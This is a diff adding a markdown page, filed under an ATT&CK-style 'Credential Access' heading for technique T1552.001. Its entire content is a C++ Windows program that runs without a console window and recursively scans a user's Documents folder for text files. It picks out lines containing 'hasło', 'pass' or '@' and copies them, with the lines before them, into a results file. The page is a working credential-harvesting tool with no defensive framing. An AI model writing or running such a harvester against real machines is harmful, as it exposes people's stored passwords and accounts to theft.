@@ -1,0 +1,61 @@
+---
+title: "T1552.001.Credentials In Files"
+folder: "08. Credential Access"
+---
+
+
+
+
+#include <iostream>
+#include <fstream>
+#include <string>
+#include <filesystem>
+#include <windows.h>
+#include <deque> // Deque for efficiently storing recent lines
+
+namespace fs = std::filesystem;
+
+void searchAndSaveLines(const std::string& directory, const std::vector<std::string>& phrases, const std::string& outputFile) {
+    std::ofstream output(outputFile);
+    if (!output) {
+        output << "Cannot open output file." << std::endl;
+        return;
+    }
+
+    for (const auto& entry : fs::recursive_directory_iterator(directory)) {
+        if (entry.is_regular_file() && entry.path().extension() == ".txt") {
+            std::ifstream file(entry.path());
+            if (file) {
+                output << "------------" << entry.path() << "-------------" << std::endl;
+                std::deque<std::string> recentLines; // Store recent lines
+                std::string line;
+                while (std::getline(file, line)) {
+                    recentLines.push_back(line); // Add line to recent lines
+                    if (recentLines.size() > 4) { // Keep only last 4 lines
+                        recentLines.pop_front();
+                    }
+                    for (const auto& phrase : phrases) {
+                        if (line.find(phrase) != std::string::npos) {
+                            for (const auto& savedLine : recentLines) {
+                                output << savedLine << std::endl; // Write saved lines
+                            }
+                            recentLines.clear(); // Clear saved lines after writing
+                            break;
+                        }
+                    }
+                }
+            }
+            else {
+                output << "Cannot open file: " << entry.path() << std::endl;
+            }
+        }
+    }
+}
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    std::string directory = "C:\\Users\\User\\Documents";
+    std::vector<std::string> phrases = { "hasło", "pass", "@" };
+    std::string outputFile = "wyniki.txt";
+    searchAndSaveLines(directory, phrases, outputFile);
+    return 0;
+}
